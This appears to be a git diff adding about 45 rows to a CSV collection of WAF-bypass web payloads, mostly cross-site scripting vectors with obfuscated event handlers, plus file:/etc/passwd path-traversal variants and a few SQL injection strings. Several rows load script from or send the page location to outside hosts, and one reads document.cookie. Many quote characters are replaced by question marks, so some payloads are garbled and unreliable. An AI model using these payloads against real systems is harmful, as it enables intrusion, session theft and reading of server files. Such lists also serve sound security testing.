@@ -308,4 +308,47 @@ https://twitter.com/TheJulfikar/status/1321492850375208960,<script>%0d%0aalert(1
 https://twitter.com/TheJulfikar/status/1321492850375208960,<scr<script>ipt>alert(1);</scr</script>ipt>,xss
 https://twitter.com/TheJulfikar/status/1321492850375208960,"<a/href=""j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;"">",xss
 https://twitter.com/TheJulfikar/status/1321492850375208960,<svg•onload=alert(1)>,xss
-test,test,test
+https://waf-bypass.com/,?><img src=x onmouseleave=print()>,xss
+https://waf-bypass.com/,"?><a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1*/;location.assign(?//hackerone.com/stealthy?x=?+location)?>Click",xss
+https://waf-bypass.com/,"<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>",xss
+https://waf-bypass.com/,<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>,xss
+https://waf-bypass.com/,<svg><circle><set onbegin=prompt(1) attributename=fill>,xss
+https://waf-bypass.com/,<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>,xss
+https://waf-bypass.com/,%3balert`1`%3b,xss
+https://waf-bypass.com/,"asd""`> onpointerenter=x=prompt,x`XSS`",xss
+https://waf-bypass.com/,<x onauxclick=import('//1152848220/')>click,xss
+https://waf-bypass.com/,<x onauxclick=a=alert,a(domain)>click -@niksthehacker,xss
+https://waf-bypass.com/,<x onauxclick=import('//1152848220/')>click,xss
+https://waf-bypass.com/,<x onauxclick=import('//xss/')>click,xss
+https://waf-bypass.com/,"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",xss
+https://waf-bypass.com/,{{constructor.constructor(alert`1`)()}},xss
+https://waf-bypass.com/,"javascript:new%20Function`al\ert\`1\``;",xss
+https://waf-bypass.com/,"<script>Object.prototype.BOOMR = 1;",xss
+https://waf-bypass.com/,Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> -https://portswigger.net/web-security/cross-site-scripting/cheat-sheet,xss
+https://waf-bypass.com/,">%0D%0A%0D%0A<x '=foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>",xss
+https://waf-bypass.com/,>'><details/open/ontoggle=confirm('XSS')>,xss
+https://waf-bypass.com/,6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,xss
+https://waf-bypass.com/,"&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;",xss
+https://waf-bypass.com/,file:/etc/passwd?/,lfi
+https://waf-bypass.com/,file:/etc/passwd%3F/,lfi
+https://waf-bypass.com/,file:/etc%252Fpasswd/,lfi
+https://waf-bypass.com/,file:/etc%252Fpasswd%3F/,lfi
+https://waf-bypass.com/,file:///etc/?/../passwd,lfi
+https://waf-bypass.com/,file:///etc/%3F/../passwd,lfi
+https://waf-bypass.com/,file:${br}/et${u}c/pas${te}swd?/,lfi
+https://waf-bypass.com/,file:$(br)/et$(u)c/pas$(te)swd?/,lfi
+https://waf-bypass.com/,`\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29?`,
+https://waf-bypass.com/,?XOR(if(now()=sysdate(),sleep(5*5),0))OR?,sqli
+https://waf-bypass.com/,"= onfocus=$.ajax({url:?http://&#8217;.concat(?yourxsshunder .xss.ht?),dataType:?script?,success:?success?})",xss
+https://waf-bypass.com/,<input id=?a?value=?global?><input id=?b?value=?E?><input ?id=?c?value=?val?><input id=?d?value=?aler?><input id=?e?value=?t(documen?><input id=?f?value=?t.domain)?><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>,xss
+https://waf-bypass.com/,?><img src=1 onmouseleave=print()>,xss
+https://waf-bypass.com/,uniUNIONon,sqli
+https://waf-bypass.com/,<a?/onclick=(confirm)(document.cookie)>Click Here!,xss
+https://waf-bypass.com/,<svg onload=prompt%26%230000000040document.domain)>,xss
+https://waf-bypass.com/,"<svg onload=prompt%26%23?000000028;document.domain)>",xss
+https://waf-bypass.com/,"<x/onclick=globalThis&lsqb;?\u0070r\u006f?+?mpt?]&lt;)>clickme",xss
+https://waf-bypass.com/,test?,prompt%0A/*HelloWorld*/(document.domain),xss
+https://waf-bypass.com/,? <a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus> ?,xss
+https://waf-bypass.com/,<svg onload=prompt%26%230000000040document.domain)>,xss
+https://waf-bypass.com/,"<svg onload=prompt%26%23?000000028;document.domain)>",xss
+https://waf-bypass.com/,../et*/pas**d,lfi
